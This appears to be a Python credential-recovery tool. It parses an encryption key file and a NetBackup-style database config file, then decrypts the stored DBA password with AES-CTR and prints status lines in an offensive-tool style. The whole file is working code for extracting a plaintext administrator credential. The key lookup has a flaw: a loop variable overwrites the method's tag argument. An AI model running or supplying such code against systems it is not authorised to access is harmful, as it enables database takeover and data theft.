from Crypto.Cipher import AES
from Crypto.Util import Counter
import codecs

#decryptor helper
class Decryptor(object):

    def __init__(self, keyfile, encryptedPasswordFile):
        self.RECORD_LEN = 268
        self.KEY_OFF = 0x89
        self.TAG_OFF = 0x08
        self.yekcnedwssap = keyfile
        self.vxdbmsconf = encryptedPasswordFile

    #retrieve encryption key
    def encryptionKey(self, tag):
        try:
            with open(self.yekcnedwssap, "rb") as f:
                with open(self.vxdbmsconf, "r") as conf:
                    yekcnedwssapbytes = f.read()
                    if len(yekcnedwssapbytes) % self.RECORD_LEN != 0:
                        print("Wrong file format for encryption key {}: unexpected length".format(self.yekcnedwssap))
                        return None

                    confstr = conf.read()
                    records = {}
                    for i in range(0, int(len(yekcnedwssapbytes) / self.RECORD_LEN)):
                        raw = yekcnedwssapbytes[
                            i * self.RECORD_LEN : i * self.RECORD_LEN
                            + self.RECORD_LEN
                            - 1
                        ]
                        tag = codecs.encode(
                            raw[self.TAG_OFF : self.KEY_OFF - 1].rstrip(b"\x00"), "hex"
                        ).decode()
                        key = codecs.encode(
                            raw[self.KEY_OFF :].rstrip(b"\x00"), "hex"
                        ).decode()
                        records[tag] = key

                for i in records:    
                    if i in tag:
                        return records[i]
                    if i in confstr:
                        print("[+] Encryption key found: {}".format(records[i]))
                        return records[i]

                print("[-] Encrypted password and encrypted key not found")
                return None
        except (FileNotFoundError, UnicodeDecodeError) as e:
            print("[-] File not found or with wrong format, parsing aborted: {}".format(e))
            return None
    #retrieve encrypted password
    def retrieveEncPsw(self):
        try:
            with open(self.vxdbmsconf, "r") as f:
                vxdbmsconf = f.readlines()
                for l in vxdbmsconf:
                    if "VXDBMS_NB_PASSWORD" in l:
                        pwd = l.split(":")[1][:-4]
                        return pwd
                return None
        except (FileNotFoundError, UnicodeDecodeError):
            print("[-] File not found or with wrong format. Parsing aborted.")
            return None


    #decrypt DBA password
    def decryptPassword(self, dbaPassword, encKey, info):
        if info: print("[+] Encrypted DBA password {}".format(dbaPassword))
        iv = codecs.decode(dbaPassword[: 32], "hex")
        encpwd = codecs.decode(dbaPassword[32 :], "hex")
        ctr = Counter.new(128, initial_value=int.from_bytes(iv, "big"))

        aes = AES.new(encKey, AES.MODE_CTR, counter=ctr)
        pwd = aes.decrypt(encpwd)
        return pwd.decode("ASCII")
